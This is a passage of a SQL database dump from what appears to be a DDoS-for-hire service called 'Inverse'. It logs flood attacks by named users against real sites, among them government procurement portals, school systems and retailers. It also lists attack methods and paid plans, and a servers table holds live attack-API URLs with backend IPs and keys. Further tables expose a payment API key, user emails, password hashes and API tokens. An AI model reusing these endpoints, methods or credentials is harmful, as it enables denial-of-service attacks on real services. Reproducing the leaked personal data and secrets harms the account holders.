(268522, 'Cas171945', 'https://centrum.lkpp.go.id/', 80, 80, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1745148386, '2025-04-20 13:26:26'),
(268523, 'Cas171945', 'https://ads.google.com/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745149977, '2025-04-20 13:52:57'),
(268524, 'Cas171945', 'https://ads.google.com/', 80, 80, 'TLS', 1, 0, 'TLS', 0, 0, 1745150080, '2025-04-20 13:54:40'),
(268525, 'Cas171945', 'https://superchatworld.site/', 80, 80, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1745212183, '2025-04-21 07:09:43'),
(268526, 'Cas171945', 'https://superchatworld.site/', 80, 80, 'BROWSER', 1, 0, 'BROWSERV2', 1, 0, 1745212311, '2025-04-21 07:11:51'),
(268527, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745221844, '2025-04-21 09:50:44'),
(268528, 'Cas171945', 'https://ip-count.dstat.uk/', 80, 200, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745222149, '2025-04-21 09:55:49'),
(268529, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 2, 0, 'H2MERIS', 1, 0, 1745223438, '2025-04-21 10:17:18'),
(268530, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 2, 0, 'H2MERIS', 1, 0, 1745223438, '2025-04-21 10:17:18'),
(268531, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745223633, '2025-04-21 10:20:33'),
(268532, 'Cas171945', 'https://ip-count.dstat.uk/', 80, 250, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745224552, '2025-04-21 10:35:52'),
(268533, 'eunsoobf', 'https://www.japanesepod101.com/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745225741, '2025-04-21 10:55:41'),
(268534, 'Cas171945', 'https://thesatanictemple.com', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745235081, '2025-04-21 13:31:21'),
(268535, 'Cas171945', 'https://uam.dstatbot.org/7d2ca14f-b98c-428a-b1ec-7b42862279e9', 80, 200, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1745239631, '2025-04-21 14:47:11'),
(268536, 'Cas171945', 'https://count.intenseapi.com/pavckz', 80, 190, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745254730, '2025-04-21 18:58:50'),
(268537, 'Cas171945', 'https://intenseapi.com/tskhgo', 80, 190, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1745258152, '2025-04-21 19:55:52'),
(268538, 'Cas171945', 'https://shopee.co.id/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745289842, '2025-04-22 04:44:02'),
(268539, 'eunsoobf', 'https://www.howtostudykorean.com/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745294904, '2025-04-22 06:08:24'),
(268540, 'eunsoobf', 'https://indonesia.travel/gb/en/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745295153, '2025-04-22 06:12:33'),
(268541, 'Cas171945', 'https://bcode-gen.shop/', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1745302931, '2025-04-22 08:22:11'),
(268542, 'Cas171945', 'https://centrum.lkpp.go.id/', 80, 80, 'STORMBYPASS', 1, 0, 'STORMBYPASS', 0, 0, 1745303875, '2025-04-22 08:37:55'),
(268543, 'Cas171945', 'https://login.yahoo.com/', 80, 80, 'TLS', 1, 0, 'TLS', 0, 0, 1745312664, '2025-04-22 11:04:24'),
(268544, 'xxxcel', 'https://golroblox.com', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745316857, '2025-04-22 12:14:17'),
(268545, 'xxxcel', 'https://gogogo.id', 80, 120, 'RAPID', 1, 0, 'Rapid', 1, 0, 1745329296, '2025-04-22 15:41:36'),
(268546, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745329897, '2025-04-22 15:51:37'),
(268547, 'xxxcel', 'https://request.layer7dstat.uk/', 80, 200, 'VSE', 1, 0, 'VSE', 1, 0, 1745330321, '2025-04-22 15:58:41'),
(268548, 'Cas171945', 'https://intenseapi.com/sdfruq', 80, 190, 'BROWSER', 1, 0, 'BROWSERV2', 1, 0, 1745341687, '2025-04-22 19:08:07'),
(268549, 'Cas171945', 'https://translate.google.com', 80, 80, 'TLS', 1, 0, 'TLS', 0, 0, 1745344424, '2025-04-22 19:53:44'),
(268550, 'Cas171945', 'https://ip-count.dstat.uk/', 80, 240, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745345227, '2025-04-22 20:07:07'),
(268551, 'Cas171945', 'https://lpse.jatimprov.go.id/eproc4/', 80, 80, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1745379979, '2025-04-23 05:46:19'),
(268552, 'Cas171945', 'https://centrum.lkpp.go.id/', 80, 80, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1745386681, '2025-04-23 07:38:01'),
(268553, 'yoshi77', 'https://cbt.smpn3mojokerto.sch.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1745400133, '2025-04-23 11:22:13'),
(268554, 'Cas171945', '209.38.19.121', 53, 100, 'UDP', 1, 0, 'UDP', 0, 0, 1745405752, '2025-04-23 12:55:52'),
(268555, 'Cas171945', '161.35.139.104', 53, 100, 'UDP', 1, 0, 'UDP', 0, 0, 1745414117, '2025-04-23 15:15:17'),
(268556, 'Zyrexxx', 'https://omu1001.com/m/index.php', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1745426142, '2025-04-23 18:35:42'),
(268557, 'Zyrexxx', 'http://support.microsoft.com/en-us/contactus', 80, 80, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1745426477, '2025-04-23 18:41:17'),
(268558, 'Zyrexxx', 'https://maps.app.goo.gl/6knB2QhvdBJoZFvZ9', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1745427252, '2025-04-23 18:54:11'),
(268559, 'Zyrexxx', 'https://posu.cc/BABY88VIP', 80, 80, 'TLS', 1, 0, 'TLS', 0, 0, 1745451427, '2025-04-24 01:37:07'),
(268560, 'Zyrexxx', 'https://usdtjl.com/', 80, 80, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1745451808, '2025-04-24 01:43:28'),
(268561, 'xxxcel', 'https://lms.sman3jombang.sch.id', 80, 80, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1745453231, '2025-04-24 02:07:11'),
(268562, 'xxxcel', 'https://lms.sman3jombang.sch.id', 80, 180, 'RAPID', 1, 0, 'Rapid', 1, 0, 1745456444, '2025-04-24 03:00:44'),
(268563, 'xxxcel', 'https://monsta.com/', 80, 120, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1745456752, '2025-04-24 03:05:52'),
(268564, 'Cas171945', '167.71.239.50', 22, 120, 'TCP', 1, 0, 'TCPBYPASS', 1, 0, 1745462351, '2025-04-24 04:39:11'),
(268565, 'Zyrexxx', 'https://cegiltop88angin.xyz/', 80, 80, 'BROWSERV2', 1, 0, 'BROWSERV2', 1, 0, 1745463794, '2025-04-24 05:03:14'),
(268566, 'Zyrexxx', 'https://en.help.roblox.com/', 80, 60, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745464143, '2025-04-24 05:09:03'),
(268567, 'Zyrexxx', 'https://en.help.roblox.com/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745464648, '2025-04-24 05:17:28'),
(268568, 'Zyrexxx', 'https://en.help.roblox.com/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745464939, '2025-04-24 05:22:19'),
(268569, 'Cas171945', '167.71.239.50', 53, 100, 'UDP', 1, 0, 'UDP', 0, 0, 1745467865, '2025-04-24 06:11:05'),
(268570, 'Cas171945', 'https://katalog.asiagolf.id/', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1745481700, '2025-04-24 10:01:40'),
(268571, 'Zyrexxx', 'http://www.alwikobrastore.com', 80, 80, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1745490057, '2025-04-24 12:20:57'),
(268572, 'Zyrexxx', 'https://fluxus-team.net/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745490351, '2025-04-24 12:25:51'),
(268573, 'Zyrexxx', 'https://bokepindo13.media/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745492189, '2025-04-24 12:56:29'),
(268574, 'Zyrexxx', 'https://www.charleskeith.co.id/id/shoes?srsltid=AfmBOoob4Y33b0LCcoqT3J_xK4U7I_zNhnLp39UVyMlIX8V5VMN5FV-g', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745492367, '2025-04-24 12:59:27'),
(268575, 'Zyrexxx', 'https://arceusx.com/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745496187, '2025-04-24 14:03:07'),
(268576, 'eunsoobf', 'https://www.klikindomaret.com/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745497312, '2025-04-24 14:21:52'),
(268577, 'eunsoobf', 'https://alfamidi.alfamidiku.com/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745498536, '2025-04-24 14:42:16'),
(268578, 'xxxcel', '156.59.59.102', 5563, 60, 'UDP', 1, 0, 'UDP', 0, 0, 1745501561, '2025-04-24 15:32:41'),
(268579, 'xxxcel', '156.59.59.102', 5563, 60, 'TCP', 1, 0, 'TCPBYPASS', 1, 0, 1745501837, '2025-04-24 15:37:17'),
(268580, 'Zyrexxx', 'https://hotelmurah.com/', 80, 60, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745501940, '2025-04-24 15:39:00'),
(268581, 'xxxcel', 'https://atlasclient.net', 80, 120, 'RAPID', 1, 0, 'Rapid', 1, 0, 1745502552, '2025-04-24 15:49:12'),
(268582, 'Cas171945', 'https://tripay.co.id/', 80, 80, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1745503258, '2025-04-24 16:00:58'),
(268583, 'Cas171945', 'https://pristiwa.com/', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1745503635, '2025-04-24 16:07:15'),
(268584, 'eunsoobf', 'https://picsartdl.com/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745508157, '2025-04-24 17:22:37'),
(268585, 'Zyrexxx', 'https://rupshidakhilmadrasah.com/', 80, 60, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745514579, '2025-04-24 19:09:39'),
(268586, 'Zyrexxx', 'https://www.codashop.com/id-id/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745514830, '2025-04-24 19:13:50'),
(268587, 'Zyrexxx', 'https://www.codashop.com/id-id/', 80, 60, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745514960, '2025-04-24 19:16:00');

-- --------------------------------------------------------

--
-- Struktur dari tabel `bans`
--

CREATE TABLE `bans` (
  `id` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `reason` varchar(500) NOT NULL,
  `date` datetime NOT NULL,
  `expire` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `bans`
--

INSERT INTO `bans` (`id`, `userid`, `username`, `reason`, `date`, `expire`) VALUES
(35, 31283, 'kontol', 'p', '2025-04-03 08:54:03', '1970-01-01 01:00:00'),
(36, 31288, 'wahyuu', 'lukasngentotsamapohon', '2025-04-03 12:07:41', '2025-04-03 17:07:00'),
(37, 31284, 'whaxleyal', '', '2025-04-04 14:05:03', '1970-01-01 01:00:00'),
(38, 31308, 'maknyatin', 'lukasngentotsamapohon', '2025-04-05 12:10:42', '1970-01-01 01:00:00'),
(39, 31318, 'Jose639', 'y', '2025-04-12 09:53:46', '2025-04-12 14:53:00');

-- --------------------------------------------------------

--
-- Struktur dari tabel `blacklist`
--

CREATE TABLE `blacklist` (
  `id` int(11) NOT NULL,
  `target` varchar(500) NOT NULL,
  `type` enum('ASN','IP','URL','DOMAIN') NOT NULL,
  `user` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `blacklist`
--

INSERT INTO `blacklist` (`id`, `target`, `type`, `user`) VALUES
(63, 'yoshistresser.com', 'DOMAIN', 'yoshi'),
(161, '.gov', 'DOMAIN', 'yoshi77'),
(162, 'stressercat.net', 'DOMAIN', 'yoshi77'),
(163, 'zerostresser.ru', 'DOMAIN', 'yoshi77'),
(164, '1.1.1.1', 'IP', 'yoshi77');

-- --------------------------------------------------------

--
-- Struktur dari tabel `coupons`
--

CREATE TABLE `coupons` (
  `id` int(11) NOT NULL,
  `code` varchar(255) NOT NULL,
  `percent` int(11) NOT NULL,
  `created_at` datetime NOT NULL,
  `expire_at` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `methods`
--

CREATE TABLE `methods` (
  `id` int(11) NOT NULL,
  `apiname` varchar(255) NOT NULL,
  `publicname` varchar(255) NOT NULL,
  `type` enum('FREEL4','AMP','UDP','TCP','BOTNET','FREEL7','BASICL7','PREMIUML7') NOT NULL,
  `premium` int(11) NOT NULL,
  `timelimit` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `methods`
--

INSERT INTO `methods` (`id`, `apiname`, `publicname`, `type`, `premium`, `timelimit`) VALUES
(104, 'H2MERIS', 'HTTP/2 Meris', 'PREMIUML7', 1, 500),
(108, 'H2NEYLI', 'HTTP/2 Neyli', 'PREMIUML7', 1, 300),
(109, 'H2FLASH', 'HTTP/2 Flash', 'PREMIUML7', 1, 300),
(111, 'BROWSER', 'BROWSER', 'PREMIUML7', 1, 300),
(112, 'HYPERBLAST', 'HYPER BLAST', 'PREMIUML7', 1, 500),
(113, 'STORMRUSH', 'STORM RUSH', 'PREMIUML7', 1, 500),
(115, 'H2BYPASS', 'HTTP/2 Bypass', 'BASICL7', 0, 300),
(116, 'STORMBYPASS', 'STORM BYPASS', 'BASICL7', 0, 300),
(117, 'FLOOD', 'Flood', 'BASICL7', 0, 300),
(118, 'TLS', 'TLS', 'BASICL7', 0, 300),
(119, 'MIX', 'Mix', 'BASICL7', 0, 300),
(120, 'JOUMA', 'Jouma', 'BASICL7', 0, 300),
(122, 'TCP', 'Tcp Flood', 'TCP', 1, 120),
(123, 'MIXBILL', 'Mixbill', 'BASICL7', 0, 300),
(125, 'HTTPS', 'HTTPS', 'BASICL7', 0, 300),
(126, 'QUANTUM', 'Quantum', 'PREMIUML7', 1, 300),
(127, 'VSE', 'VSE', 'PREMIUML7', 1, 300),
(128, 'RAPID', 'Rapid', 'PREMIUML7', 1, 300),
(129, 'BROWSERV2', 'Browser-V2', 'PREMIUML7', 1, 300),
(131, 'MCBOT', 'McBot', 'UDP', 1, 120),
(132, 'HOLD', 'Hold', 'PREMIUML7', 1, 2000),
(133, 'UDP', 'Udp Flood', 'UDP', 0, 120),
(134, 'TCPBYPASS', 'Tcp Bypass', 'TCP', 1, 120);

-- --------------------------------------------------------

--
-- Struktur dari tabel `news`
--

CREATE TABLE `news` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `icon` enum('fire','heart','bolt','gift','database','adjust','exclamation','template','ban','dollar') NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `notifications`
--

CREATE TABLE `notifications` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `content` varchar(1024) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `payments`
--

CREATE TABLE `payments` (
  `id` int(11) NOT NULL,
  `uniqid` varchar(1000) NOT NULL,
  `user` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `amount` int(11) NOT NULL,
  `crypto_address` varchar(1000) NOT NULL,
  `crypto_amount` varchar(255) NOT NULL,
  `amount_paid` varchar(255) NOT NULL DEFAULT '0',
  `crypto_uri` varchar(500) NOT NULL,
  `gateway` varchar(255) NOT NULL,
  `confirmations` int(11) DEFAULT 0,
  `hash` varchar(500) NOT NULL DEFAULT 'Please pay to get hash',
  `created_at` int(11) NOT NULL,
  `status` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `plans`
--

CREATE TABLE `plans` (
  `id` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `premium` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `concs` int(11) NOT NULL,
  `length` int(11) NOT NULL,
  `lengthtype` varchar(255) NOT NULL,
  `pagelength` varchar(255) NOT NULL,
  `private` varchar(5) NOT NULL,
  `apiaccess` int(11) NOT NULL,
  `supportprio` int(11) NOT NULL,
  `price` int(11) NOT NULL,
  `custom` varchar(5) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `plans`
--

INSERT INTO `plans` (`id`, `name`, `premium`, `time`, `concs`, `length`, `lengthtype`, `pagelength`, `private`, `apiaccess`, `supportprio`, `price`, `custom`) VALUES
(59, 'Beginner Plan', 1, 300, 1, 7, 'Days', 'day', 'no', 0, 0, 12, 'no'),
(60, 'Pro Plan', 1, 300, 1, 30, 'Days', 'day', 'no', 0, 0, 20, 'no'),
(61, 'Businnes Plan', 1, 2000, 1, 30, 'Days', 'day', 'no', 0, 1, 50, 'no'),
(64, 'Owner Plans', 1, 99999999, 9999999, 200000000, 'Years', 'month', 'yes', 1, 1, 99999, 'yes');

-- --------------------------------------------------------

--
-- Struktur dari tabel `plan_purchases`
--

CREATE TABLE `plan_purchases` (
  `id` int(11) NOT NULL,
  `user` varchar(255) NOT NULL,
  `plan` varchar(255) NOT NULL,
  `amount` int(11) NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `plan_purchases`
--

INSERT INTO `plan_purchases` (`id`, `user`, `plan`, `amount`, `date`) VALUES
(37, 'kavern77', 'Beginner Plan', 12, '2025-04-03 22:29:58');

-- --------------------------------------------------------

--
-- Struktur dari tabel `servers`
--

CREATE TABLE `servers` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `apiurl` varchar(1024) NOT NULL,
  `methods` varchar(1000) NOT NULL,
  `type` varchar(255) NOT NULL,
  `premium` varchar(255) NOT NULL DEFAULT 'no',
  `slots` int(11) NOT NULL,
  `status` enum('online','offline','maintaince') NOT NULL,
  `lastused` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `servers`
--

INSERT INTO `servers` (`id`, `name`, `apiurl`, `methods`, `type`, `premium`, `slots`, `status`, `lastused`) VALUES
(326, 'H2MERIS', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=H2-FURY&key=TinYosWebSetresqe', 'H2MERIS', 'l7', 'yes', 10, 'online', '2025-04-03 02:08:31'),
(327, 'H2NEYLI', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=H2-VERN&key=TinYosWebSetresqe', 'H2NEYLI', 'l7', 'yes', 10, 'online', '2025-04-03 02:09:48'),
(328, 'H2FLASH', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=H2&key=TinYosWebSetresqe', 'H2FLASH', 'l7', 'yes', 10, 'online', '2025-04-03 02:10:46'),
(329, 'HOLD', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=HOLD&key=TinYosWebSetresqe', 'HOLD', 'l7', 'yes', 10, 'online', '2025-04-03 02:11:12'),
(330, 'BROWSER', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=BROWSER&key=TinYosWebSetresqe', 'BROWSER', 'l7', 'yes', 10, 'online', '2025-04-03 02:11:38'),
(331, 'HYPERBLAST', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=HYPER-BLAST&key=TinYosWebSetresqe', 'HYPERBLAST', 'l7', 'yes', 10, 'online', '2025-04-03 02:13:06'),
(332, 'STORMRUSH', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=STORM-RUSH&key=TinYosWebSetresqe', 'STORMRUSH', 'l7', 'yes', 10, 'online', '2025-04-03 02:13:47'),
(333, 'STORMBYPASS', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=STORM-BYPASS&key=TinYosWebSetresqe', 'STORMBYPASS', 'l7', 'no', 10, 'online', '2025-04-03 02:14:15'),
(334, 'H2BYPASS', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=VERN-B&key=TinYosWebSetresqe', 'H2BYPASS', 'l7', 'no', 10, 'online', '2025-04-03 02:14:52'),
(335, 'JOUMA', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=H2-JOUMA&key=TinYosWebSetresqe', 'JOUMA', 'l7', 'no', 10, 'online', '2025-04-03 02:15:43'),
(336, 'FLOOD', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=V-FLOOD&key=TinYosWebSetresqe', 'FLOOD', 'l7', 'no', 10, 'online', '2025-04-03 02:16:21'),
(337, 'TLS', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=TLS&key=TinYosWebSetresqe', 'TLS', 'l7', 'no', 10, 'online', '2025-04-03 02:17:00'),
(338, 'TCP', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=TCP&key=TinYosWebSetresqe', 'TCP', 'l4', 'yes', 5, 'online', '2025-04-03 02:17:41'),
(339, 'UDP', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=UDP&key=TinYosWebSetresqe', 'UDP', 'l4', 'yes', 5, 'online', '2025-04-03 02:18:01'),
(340, 'MIX', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=MIX&key=TinYosWebSetresqe', 'MIX', 'l7', 'no', 10, 'online', '2025-04-03 02:19:10'),
(341, 'MIXBILL', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=MIXBILL&key=TinYosWebSetresqe', 'MIXBILL', 'l7', 'no', 10, 'online', '2025-04-03 02:19:59'),
(344, 'HTTPS', 'http://47.237.30.77:2906/start/attack?host=[host]&port=[port]&time=[time]&method=HTTPS&key=TinYosWebSetresqe', 'HTTPS', 'l7', 'no', 10, 'online', '2025-04-05 07:42:44'),
(354, 'Quantum', 'http://103.151.140.239:1337/api/attack?host=[host]&port=[port]&time=[time]&method=QUANTUM&key=kavernxyzhskakz1!', 'QUANTUM', 'l7', 'yes', 10, 'online', '2025-04-17 09:33:26'),
(355, 'VSE', 'http://103.151.140.239:1337/api/attack?host=[host]&port=[port]&time=[time]&method=VSE&key=kavernxyzhskakz1!', 'VSE', 'l7', 'yes', 10, 'online', '2025-04-17 09:34:29'),
(356, 'Rapid', 'http://103.151.140.239:1337/api/attack?host=[host]&port=[port]&time=[time]&method=RAPID&key=kavernxyzhskakz1!', 'RAPID', 'l7', 'yes', 10, 'online', '2025-04-17 09:35:11'),
(357, 'BROWSERV2', 'http://103.151.140.239:1337/api/attack?host=[host]&port=[port]&time=[time]&method=BROWSER&key=kavernxyzhskakz1!', 'BROWSERV2', 'l7', 'yes', 10, 'online', '2025-04-17 09:35:56'),
(358, 'TCPBYPASS', 'https://api.stressercat.net/start/attack?host=[host]&port=[port]&time=[time]&method=tcp-bypass&key=Dhe837gdksh', 'TCPBYPASS', 'l4', 'yes', 5, 'online', '2025-04-23 06:22:26'),
(359, 'MCBOT', 'https://api.stressercat.net/start/attack?host=[host]&port=[port]&time=[time]&method=mcbot&key=Dhe837gdksh', 'MCBOT', 'l4', 'yes', 5, 'online', '2025-04-23 06:23:34');

-- --------------------------------------------------------

--
-- Struktur dari tabel `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `googlesitekey` varchar(255) NOT NULL,
  `googlesecretkey` varchar(255) NOT NULL,
  `sellixapikey` varchar(500) NOT NULL,
  `name` varchar(255) NOT NULL,
  `registration` varchar(10) NOT NULL,
  `login` varchar(10) NOT NULL,
  `maintenance` varchar(25) NOT NULL DEFAULT 'no'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `settings`
--

INSERT INTO `settings` (`id`, `googlesitekey`, `googlesecretkey`, `sellixapikey`, `name`, `registration`, `login`, `maintenance`) VALUES
(1, 'none', '0x3355E846D943e272be0688a1DE8E08d50A9AA09B', 'IXxLHCB2DWcSiQWu9C9Lb3YzRycCat2kTnyR1eO33YuUSUHSAClmZosO7MqF9Wp0', 'Inverse', 'on', 'on', 'no');

-- --------------------------------------------------------

--
-- Struktur dari tabel `sheduledattacks`
--

CREATE TABLE `sheduledattacks` (
  `id` int(11) NOT NULL,
  `user` varchar(255) NOT NULL,
  `target` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `method` varchar(255) NOT NULL,
  `started` int(11) NOT NULL DEFAULT 0,
  `datetime` int(11) NOT NULL,
  `created` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `tickets`
--

CREATE TABLE `tickets` (
  `id` int(11) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `msg` text NOT NULL,
  `priority` enum('low','normal','high') NOT NULL DEFAULT 'normal',
  `user` varchar(255) NOT NULL,
  `created` datetime NOT NULL,
  `status` enum('open','closed','answered','customer-reply') NOT NULL DEFAULT 'open'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `tickets_replies`
--

CREATE TABLE `tickets_replies` (
  `id` int(11) NOT NULL,
  `ticket_id` int(11) NOT NULL,
  `msg` text NOT NULL,
  `sender` enum('admin','support','customer','') NOT NULL,
  `created` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(15) NOT NULL,
  `password` varchar(40) NOT NULL,
  `email` varchar(50) NOT NULL,
  `secretkey` varchar(20) NOT NULL,
  `rank` varchar(20) NOT NULL DEFAULT 'User',
  `plan` int(11) NOT NULL DEFAULT 0,
  `planexpire` int(11) NOT NULL DEFAULT 1658186997,
  `premium` int(11) NOT NULL DEFAULT 0,
  `apiaccess` int(11) NOT NULL DEFAULT 0,
  `apitoken` varchar(255) NOT NULL DEFAULT '0',
  `addon_concs` int(11) NOT NULL DEFAULT 0,
  `addon_time` int(11) NOT NULL DEFAULT 0,
  `addon_blacklist` int(11) NOT NULL DEFAULT 0,
  `balance` varchar(255) NOT NULL,
  `created` datetime(6) NOT NULL,
  `lastlogin` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `secretkey`, `rank`, `plan`, `planexpire`, `premium`, `apiaccess`, `apitoken`, `addon_concs`, `addon_time`, `addon_blacklist`, `balance`, `created`, `lastlogin`) VALUES
(31276, 'yoshi77', '897fb718ec1c480080fbcc11466f88651e853896', 'tindidin162@gmail.com', '797e8b68d8bccbed', 'AdDolbaebmin', 64, 1746363384, 1, 1, 'cpqkgS8EyAD1pmTIrVvd3T', 0, 0, 0, '9999999999999', '2025-03-28 01:31:34.000000', '2025-04-23 14:31:53'),
(31277, 'kavern77', 'a9a42c1c5fabfaa600605a4d643675caa2e40a63', 'kavern77@gmail.com', 'ec89efd48fd4ccfa', 'AdDolbaebmin', 64, 1746363391, 1, 1, 'onOEwDMDW9BAXo7mCGxAju', 0, 0, 0, '9223372036854775807', '2025-03-28 02:22:58.000000', '2025-04-20 07:28:21'),
(31278, 'xyran1337', '40a7807dbbd9ba492a40b79573e66afc1480e46f', 'xyran@stressercat.net', 'a696254e2d85cb5d', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-03-29 05:14:24.000000', '2025-03-29 05:14:24'),
